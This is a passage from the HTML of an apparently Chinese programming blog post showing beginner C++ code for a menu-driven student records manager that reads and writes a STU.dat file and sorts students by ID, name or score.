class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    STU S;</span><br><span class=\"line\">    S.TITLE_STU();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> choice;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;choice)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(choice==<span class=\"number\">1</span>)S.ADD_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">2</span>)S.CHANGE_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">3</span>)S.DEL_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">4</span>)S.SHOW_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">5</span>)S.SORT_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">6</span>)S.MAX_STU();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(choice==<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        system(<span class=\"string\">&quot;PAUSE&amp;CLS&quot;</span>);</span><br><span class=\"line\">        S.TITLE_STU();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>文件操作:</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iomanip&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> ll;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> K = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">STU</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\tll Num;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> Name[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> Sex;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> Score;</span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> flag;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">READ_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">WRITE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">TITLE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ADD_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">CHANGE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DEL_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">SHOW_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">SORT_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">MAX_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">friend</span> <span class=\"keyword\">bool</span> <span class=\"title\">CMP1</span><span class=\"params\">(STU, STU)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">friend</span> <span class=\"keyword\">bool</span> <span class=\"title\">CMP2</span><span class=\"params\">(STU, STU)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">friend</span> <span class=\"keyword\">bool</span> <span class=\"title\">CMP3</span><span class=\"params\">(STU, STU)</span></span>;</span><br><span class=\"line\">\tSTU()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t~STU() &#123;&#125;</span><br><span class=\"line\">&#125;Boy[<span class=\"number\">1000</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::READ_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tFILE *fp = fopen(<span class=\"string\">&quot;STU.dat&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">fscanf</span>(fp, <span class=\"string\">&quot;%lld %s %c %lf&quot;</span>, &amp;Boy[K].Num, &amp;Boy[K].Name, &amp;Boy[K].Sex, &amp;Boy[K].Score) != EOF)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tBoy[K].flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tK++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::WRITE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tFILE *fp = fopen(<span class=\"string\">&quot;STU.dat&quot;</span>, <span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; K; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(Boy[i].flag==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(fp, <span class=\"string\">&quot;%lld %s %c %lf\\n&quot;</span>, Boy[i].Num, Boy[i].Name, Boy[i].Sex, Boy[i].Score);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CMP1</span><span class=\"params\">(STU a, STU b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a.Num&lt;b.Num;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CMP2</span><span class=\"params\">(STU a, STU b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(a.Name,b.Name)==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> a.Num&lt;b.Num;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">strcmp</span>(a.Name,b.Name)&lt;<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CMP3</span><span class=\"params\">(STU a, STU b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (a.Score == b.Score)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> a.Num&lt;b.Num;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a.Score&gt;b.Score;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::TITLE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t1:\\tADD A STUDENT&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t2:\\tCHANGE STUDENTS\\&#x27;S INFORMATION&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t3:\\tDELETE A STUDENT&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t4:\\tSHOW STUDENTS INFORMATION&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t5:\\tSORT THE STUDENTS&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t6:\\tSHOW THE MAX SCORE\\&#x27; STUDENT&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t0:\\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"string\">&quot;\\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::ADD_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请输入要添加的学生人数&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> T; <span class=\"built_in\">cin</span> &gt;&gt; T;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请输入&quot;</span> &lt;&lt; T &lt;&lt; <span class=\"string\">&quot;行学生的学号,姓名,性别,成绩&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;T; i++, K++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; Boy[K].Num &gt;&gt; Boy[K].Name &gt;&gt; Boy[K].Sex &gt;&gt; Boy[K].Score;</span><br><span class=\"line\">\t\tBoy[K].flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"string\">&quot;学生信息导入成功&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::CHANGE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请输入要修改的学生学号,输入0停止删除&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\tll num;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">cin</span> &gt;&gt; num)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;K; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (num == Boy[i].Num)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请再次输入学生的学号,姓名,性别,成绩&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cin</span> &gt;&gt; Boy[i].Num &gt;&gt; Boy[i].Name &gt;&gt; Boy[i].Sex &gt;&gt; Boy[i].Score;</span><br><span class=\"line\">\t\t\t\tBoy[i].flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t\tflag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;学生信息修改成功&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (num == <span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (flag == <span class=\"number\">0</span>)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;NO SUCH STUDENTS&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::DEL_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请输入要删除的学生学号,输入0停止删除&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\tll num;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">cin</span> &gt;&gt; num)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;K; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (num == Boy[i].Num)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tBoy[i].flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\tflag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;DELETE SUCCESS!&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (num == <span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (flag == <span class=\"number\">0</span>)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;NO SUCH STUDENTS&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::SHOW_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"string\">&quot;\\tThe Lists Of Students Are Here&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;    学号\\t姓名\\t\\t性别\\t成绩&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>.setf(<span class=\"built_in\">std</span>::ios::left);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;K; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Boy[i].flag == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; Boy[i].Num &lt;&lt; <span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; setw(<span class=\"number\">8</span>) &lt;&lt; Boy[i].Name;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\t &quot;</span> &lt;&lt; Boy[i].Sex &lt;&lt; <span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class=\"number\">2</span>) &lt;&lt; Boy[i].Score &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::SORT_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;1.按学号排序&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;2.按姓名排序&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;3.按成绩排序&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"built_in\">endl</span>;;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;请选择排序规则!&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; x;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x==<span class=\"number\">1</span>)sort(Boy, Boy + K, CMP1);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(x==<span class=\"number\">2</span>)sort(Boy, Boy + K, CMP2);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x == <span class=\"number\">3</span>)sort(Boy, Boy + K, CMP3);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;输入错误，排序失败&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"built_in\">endl</span>;;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (x == <span class=\"number\">1</span> || x == <span class=\"number\">2</span> || x == <span class=\"number\">3</span>)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;学生信息排序成功&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::MAX_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> Maxn = <span class=\"number\">0</span>, Flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;K; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Boy[i].Score &gt;= Boy[Maxn].Score)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tMaxn = i;</span><br><span class=\"line\">\t\t\tFlag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (Flag == <span class=\"number\">0</span>)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;NO STUDENT&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;    学号\\t姓名\\t\\t性别\\t成绩&quot;</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span 